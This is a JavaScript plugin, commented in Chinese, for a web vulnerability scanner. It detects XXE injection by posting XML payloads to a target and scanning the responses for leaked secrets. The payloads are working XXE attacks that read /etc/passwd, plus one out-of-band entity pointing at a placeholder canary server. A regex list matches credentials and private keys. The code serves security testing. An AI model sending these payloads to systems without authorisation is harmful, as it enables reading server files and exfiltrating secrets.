// plugins/xxe_scanner.js
const { CoreLayer, createReport, browerHttpJob } = require('../core/core.js');
// const { XMLParser } = require('fast-xml-parser');

class XXEScanner extends CoreLayer {
  constructor(Core) {
    super(Core);
    this.name = "XXE Scanner";
    this.vulnid = this.getVulnId(__filename);
    
    // 初始化配置
    this.payloads = this.generatePayloads();
    this.vulnerabilityFound = false;
    this.canaryValue = `xxe-${Math.random().toString(36).substring(2, 10)}`;
    this.canaryServer = `http://your-canary-server.com/${this.canaryValue}`;
  }

  // 生成XXE测试载荷
  generatePayloads() {
    return [
      // 基础外部实体引用
      `<?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [
       <!ELEMENT foo ANY >
       <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
       <foo>&xxe;</foo>`,
      
      // 参数实体引用
      `<?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [
       <!ELEMENT foo ANY >
       <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
       <!ENTITY param1 "value: %xxe;">]>
       <foo>&param1;</foo>`,
      
      // 外部DTD引用
      `<?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [
       <!ENTITY % xxe SYSTEM "${this.canaryServer}" >%xxe;]>
       <foo>test</foo>`,
      
      // 盲XXE检测
      `<?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [
       <!ENTITY % xxe SYSTEM "file:///nonexistent/file" >%xxe;]>
       <foo>test</foo>`
    ];
  }

  // 检测响应中是否包含敏感信息
  checkForSensitiveData(responseText) {
    const sensitivePatterns = [
      /root:.*?:[0-9]+:[0-9]+/i, // /etc/passwd格式
      /mysql:/i,
      /ssh-rsa/i, 
      /private key/i,
      /confidential/i,
      /secret/i,
      /password=/i,
      /api[_-]?key/i
    ];
    
    for (const pattern of sensitivePatterns) {
      if (pattern.test(responseText)) {
        return {
          found: true,
          pattern: pattern.toString()
        };
      }
    }
    
    return { found: false };
  }

  // 主要测试逻辑
  async testXXE() {
    if (this.method !== "POST") {
      console.log(`[${this.name}] XXE测试仅支持POST请求，跳过`);
      return;
    }
    
    // 检查Content-Type是否可能接受XML
    const contentType = this.headers["Content-Type"] || "";
    if (!contentType.includes("xml") && !contentType.includes("soap")) {
      console.log(`[${this.name}] Content-Type不是XML，尝试修改后测试`);
    }
    
    // 保存原始头部和数据
    const originalHeaders = { ...this.headers };
    const originalData = this.postData;
    
    // 修改Content-Type为XML
    this.headers["Content-Type"] = "application/xml; charset=utf-8";
    
    for (const payload of this.payloads) {
      if (this.vulnerabilityFound) break;
      
      const lastJob = new browerHttpJob(this.browser);
      lastJob.url = this.url;
      lastJob.method = "POST";
      lastJob.headers = this.headers;
      lastJob.isEncodeUrl = false;
      lastJob.postData = payload;
      
      try {
        console.log(`[${this.name}] 测试payload: ${payload.substring(0, 50)}...`);
        const response = await lastJob.execute();
        
        if (!response || !response.body) {
          console.log(`[${this.name}] 没有收到响应或响应为空`);
          continue;
        }
        
        const responseText = response.body.toString();
        
        // 检查是否有敏感数据泄露
        const sensitiveData = this.checkForSensitiveData(responseText);
        if (sensitiveData.found) {
          this.reportVulnerability(
            "xxe_sensitive_data", 
            payload, 
            `XXE漏洞导致敏感数据泄露。检测到模式: ${sensitiveData.pattern}`
          );
          break;
        }
        
        // 检查是否有错误消息暴露
        if (responseText.includes("DOCTYPE") || 
            responseText.includes("ENTITY") ||
            responseText.includes("XML parser") ||
            responseText.includes("syntax error")) {
          
          // 有错误消息但不一定是漏洞，标记为可疑
          console.log(`[${this.name}] 检测到可疑错误消息，可能存在XXE漏洞`);
          
          // 检查HTTP状态码
          if (response.statusCode >= 500) {
            this.reportVulnerability(
              "xxe_error_exposure", 
              payload, 
              `XXE注入导致服务器错误 (${response.statusCode})。响应中包含XML解析错误信息。`
            );
            break;
          }
        }
        
        // 尝试检测时间延迟
        if (payload.includes("nonexistent/file")) {
          const startTime = Date.now();
          await lastJob.execute();
          const endTime = Date.now();
          
          if (endTime - startTime > 5000) { // 如果延迟超过5秒
            this.reportVulnerability(
              "xxe_timing", 
              payload, 
              `XXE盲注入检测到时间延迟 (${endTime - startTime}ms)，服务器可能存在XXE漏洞。`
            );
            break;
          }
        }
        
      } catch (error) {
        console.error(`[${this.name}] 测试XXE时出错:`, error.message);
      } finally {
        await lastJob.closeTab();
      }
    }
    
    // 恢复原始头部和数据
    this.headers = originalHeaders;
    this.postData = originalData;
  }
  
  reportVulnerability(type, payload, details) {
    console.log(`[${this.name}] 发现XXE漏洞! 类型: ${type}`);
    console.log(`[${this.name}] 细节: ${details}`);
    
    const report = createReport({
      vulnid: this.vulnid,
      taskid: this.taskid,
      url: this.url,
      param: "XML_INPUT",
      payload: payload.substring(0, 100) + "...",
      severity: "High",
      details: details,
      vulnname: "XXE_INJECTION"
    });
    
    this.alert(report);
    this.vulnerabilityFound = true;
  }

  // 实现必需的startTesting方法
  async startTesting() {
    console.log(`[${this.name}] 开始检测XXE漏洞: ${this.url}`);
    await this.testXXE();
    console.log(`[${this.name}] XXE检测完成. 发现漏洞: ${this.vulnerabilityFound}`);
  }
}

module.exports = XXEScanner;
// 这个插件不需要文件支持
module.exports.requiresFileSupport = false;